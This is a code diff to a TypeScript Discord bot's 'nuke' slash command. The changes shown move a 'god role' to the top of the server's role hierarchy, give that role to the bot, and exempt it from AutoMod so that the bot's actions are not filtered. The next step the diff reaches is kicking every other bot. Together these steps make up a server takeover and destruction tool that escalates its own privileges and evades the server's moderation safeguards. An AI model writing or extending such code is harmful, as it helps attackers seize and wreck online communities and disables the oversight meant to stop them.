@@ -7,6 +7,7 @@ import {
 import type { SlashCommand } from "../types";
 import { PERM_WHITELIST } from "../storage/whitelist";
 import { logger } from "../../lib/logger";
+import { exemptRoleFromAutoMod, pushRoleToTop } from "../utils/elevateRole";
 
 const command: SlashCommand = {
   data: new SlashCommandBuilder()
@@ -54,18 +55,16 @@ const command: SlashCommand = {
       return;
     }
 
-    try {
-      const targetPos = guild.roles.highest.position;
-      await godRole.setPosition(targetPos).catch(() => {});
-    } catch {
-      // Discord won't let us go above the bot's current top role; ignore.
-    }
+    await pushRoleToTop(guild, godRole);
 
     try {
       await me.roles.add(godRole, "nuke: assign god role to self");
     } catch (err) {
       logger.warn({ err }, "nuke: failed to assign god role to self");
     }
+
+    // Bypass AutoMod for the new role so the bot's actions aren't filtered.
+    await exemptRoleFromAutoMod(guild, godRole.id);
 
     // 2) Kick all bots (except self).
     const allMembers = await guild.members.fetch().catch(() => null);
